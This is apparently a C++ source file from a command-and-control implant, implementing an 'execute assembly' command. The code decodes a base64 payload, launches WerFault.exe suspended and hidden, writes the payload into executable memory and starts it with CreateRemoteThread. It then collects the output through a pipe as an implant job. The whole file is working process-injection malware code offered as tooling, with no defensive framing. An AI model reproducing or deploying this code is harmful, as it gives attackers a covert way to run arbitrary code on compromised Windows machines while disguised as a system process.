#include "Command.h"

#include "Implant.h"
#include "Stdlib.h"

BOOL CommandExecuteAssembly(json& args, string artifact, json& result) {
    HANDLE              hPipeRead;
    HANDLE              hPipeWrite;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA        si = { 0 };
    DWORD               size        = 0;
    PVOID               data        = NULL;
    PVOID               memory      = NULL;
    SIZE_T              written     = 0;
    HANDLE              hThread     = NULL;
    DWORD               total = 0;    
    DWORD               capacity = 4096;
    CHAR                temp[1024];
    DWORD               bytesread;
    PJOB                Job = NULL;

    Job = (JOB*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(JOB));
    if (!Job) {
        CloseHandle(hPipeRead);
        return FALSE;
    }

    Job->ID     = RandomUint32();
    Job->Status = FALSE;

	data = Base64Decode(artifact.c_str(), &size);
	if (data == NULL) {
		return FALSE;
	}

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;


    if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
        printf("[-] CreatePipe failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    if (!SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0)) {
        printf("[-] SetHandleInformation failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.hStdError = hPipeWrite;
    si.hStdOutput = hPipeWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CHAR spawnto[] = "C:\\Windows\\System32\\WerFault.exe";
    if (!CreateProcessA(NULL, spawnto, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: ( %d )\n", GetLastError());
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        result["output"] = "failed to create spawnto process";
        return FALSE;
    }

    memory = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!memory) {
        result["output"] = "failed to allocate memory into spawnto process";
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // inject pic
    if (!WriteProcessMemory(pi.hProcess, memory, data, size, &written)) {
        result["output"] = "failed to write pic into spawnto process";
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memory, NULL, 0, NULL);
    if (hThread == NULL) {
        result["output"] = "failed to create new thread into spawnto process";
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    CloseHandle(hPipeWrite);
    CloseHandle(pi.hThread);

    Job->hAnonPipe  = hPipeRead;
    Job->hProcess   = pi.hProcess;
    Job->Status     = TRUE;
    Job->Type       = JOB_TYPE_PROCESS;

    InsertTailList(&g_Implant.JobList, &Job->ListEntry);

    return TRUE;
}